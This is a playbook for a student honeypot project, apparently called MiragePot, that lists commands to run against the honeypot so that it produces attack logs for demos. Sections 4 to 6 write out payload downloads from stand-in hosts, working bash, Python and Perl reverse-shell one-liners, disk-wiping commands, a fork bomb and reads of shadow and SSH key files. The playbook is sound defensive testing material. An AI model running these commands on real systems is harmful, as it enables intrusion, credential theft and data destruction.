# MiragePot Attacker Playbook

This document describes how to interact with MiragePot from an attacker's
point of view. It is intended for demos, testing, and as a reference
when you want to generate realistic attack traffic against your own
honeypot.

> Important: MiragePot is a **simulation**. All commands below affect the
> fake in-memory environment only. Nothing is executed on the real
> operating system, and no actual disks or files are modified.

---

## 1. Connecting to MiragePot

From the attacker's machine (or a second terminal on the same host),
connect via SSH to the MiragePot instance:

```bash
ssh root@<miragepot-ip> -p 2222
# Example if running locally:
ssh root@127.0.0.1 -p 2222
```

- Any username and any password will be accepted.
- You should see a prompt similar to:

```text
root@miragepot:~#
```

All commands below are meant to be typed at this prompt.

---

## 2. Phase 1: Basic Reconnaissance

Start by behaving like a normal attacker who has just gained SSH access
and wants to learn about the system.

### 2.1 Identity and environment

```bash
whoami
pwd
ls
uname -a
id
```

### 2.2 Filesystem discovery

```bash
ls /
ls /root
ls /home
cat /etc/os-release
cat /etc/passwd
```

### 2.3 Processes and networking (simulated)

```bash
ps aux
netstat -tulnp
ifconfig
ip a
```

**What this shows in the project:**

- MiragePot responds like a real Linux system for standard commands.
- Low/medium risk commands generate entries in the session logs.

---

## 3. Phase 2: Fake Filesystem Interaction

MiragePot maintains a per-session **fake filesystem** entirely in
memory. You can use typical shell commands, but all changes only exist
inside the honeypot.

### 3.1 Creating directories and files

```bash
mkdir tools
cd tools
pwd
ls
```

Create a fake notes file:

```bash
touch notes.txt
ls
echo "first line" > notes.txt
echo "second line" >> notes.txt
cat notes.txt
```

Create another directory and script:

```bash
mkdir scripts
cd scripts
echo "echo hello from fake script" > test.sh
ls
cat test.sh
cd ..
ls
```

### 3.2 Exploring behavior of rm (simulated)

```bash
ls
rm notes.txt
ls
rm scripts
ls
```

- `rm` removes fake files and empty fake directories from the simulated
  filesystem.
- If you try to remove a non-empty directory, you'll get an error like
  `Is a directory`, mimicking real `rm` behavior.

**What this shows in the project:**

- The in-memory fake filesystem works and maintains state across
  commands.
- Commands like `cd`, `mkdir`, `ls`, `touch`, `cat`, and `rm` behave in
  a believable way.

---

## 4. Phase 3: Malicious / High-Risk Commands

To demonstrate the **active defense** and threat scoring, you should run
commands that look like realistic attacker behavior. These will not
actually harm the host, but they will:

- Increase the `threat_score` for each command.
- Trigger the tarpit delays (1–5 seconds based on risk).
- Show up highlighted in red in the Streamlit dashboard.

### 4.1 Downloading payloads

```bash
wget http://malicious.example/payload.sh
curl http://malicious.example/shell.sh -o shell.sh
```

Other transfer commands:

```bash
scp root@1.2.3.4:/tmp/rootkit ./rootkit
rsync -avz /etc root@1.2.3.4:/backup/etc
```

### 4.2 Reconnaissance and scanning

```bash
nmap -sV 192.168.1.0/24
masscan 0.0.0.0/0 -p80
nc -lvnp 4444
```

These simulate network scanning, port probing, and listener setup.

### 4.3 Privilege escalation and account tampering

```bash
sudo su -
useradd hacker
passwd hacker
chmod +x test.sh
chown root:root test.sh
```

**Effect in MiragePot:**

- These commands are treated as medium/high risk due to keywords like
  `sudo`, `useradd`, `passwd`, `chmod`, and `chown`.
- You may experience slight delays before responses as the tarpit logic
  is applied.

---

## 5. Phase 4: Reverse Shell and Destructive Attempts

This phase is purely for demonstration. MiragePot will **not** execute
these commands for real, but running them creates very compelling log
entries and dashboard visuals.

### 5.1 Reverse shell attempts

```bash
bash -i >& /dev/tcp/1.2.3.4/4444 0>&1
python -c 'import socket,os,pty;s=socket.socket();s.connect(("1.2.3.4",4444));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("bash")'
perl -e 'use Socket;$i="1.2.3.4";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
```

### 5.2 Destructive-looking commands

```bash
rm -rf /
rm -rf /etc /var/log
dd if=/dev/zero of=/dev/sda bs=1M
mkfs.ext4 /dev/sda1
fdisk -l
:(){ :|:& };:   # fork bomb pattern
```

**Effect in MiragePot:**

- These patterns match many high/critical keywords in the defense
  module and will yield high `threat_score` values.
- The honeypot will introduce noticeable delays (up to ~5 seconds) as
  part of its tarpit behavior.
- All commands and responses are recorded in
  `data/logs/session_*.json` and visualized in the dashboard.

---

## 6. Phase 5: Credential and Config Harvesting Attempts

To simulate an attacker trying to steal sensitive data (still within the
simulated environment):

```bash
cat /etc/shadow
ls /home
ls /root/.ssh
cat /root/.ssh/authorized_keys
cat /root/.bash_history
grep -i password /etc/*
find / -name '*.pem' 2>/dev/null
```

**What this shows in the project:**

- Attempts to read typical sensitive files are captured and logged.
- You can demonstrate to faculty how a real attacker might try to obtain
  credentials and keys.

---

## 7. Ending the Session

When you are done with the "attack" session:

```bash
exit
# or
logout
```

This causes MiragePot to:

- Close the SSH session.
- Finalize the in-memory `session_log`.
- Write a JSON log file under `data/logs/` (for example,
  `data/logs/session_*.json`).

Your teammate (or you, from another browser tab) can then open the
Streamlit dashboard and review the timeline of your simulated attack.

---

## 8. Using the Dashboard to Review the Attack

1. Start the dashboard (if not already running):

   ```bash
   streamlit run dashboard/app.py
   ```

2. Open the URL shown in the terminal (typically
   `http://localhost:8501`).

3. In the web UI:
   - Look at the **Sessions Overview** table.
   - Identify the session corresponding to your IP and login time.
   - Select that session to view a **Command Timeline**.

4. For each command in the timeline you will see:
   - Timestamp
   - Command text
   - Response text (fake or AI-generated)
   - Threat score
   - Delay applied (tarpit)
   - A colored risk indicator (green / yellow / red)

This provides a complete picture of the simulated attack and is ideal
for explaining MiragePot to instructors, examiners, or teammates.

---

## 9. Summary

This attacker playbook is a reference for driving MiragePot during
presentations and tests. By following the phases above (recon,
filesystem interaction, malicious commands, credentials hunting, and
session termination), you can:

- Generate realistic, multi-step attack scenarios.
- Populate the honeypot logs with rich data.
- Clearly demonstrate MiragePot's deception, logging, and active
  defense capabilities.

Remember to always run these commands **only** against the MiragePot SSH
port (2222) and not against real production systems.
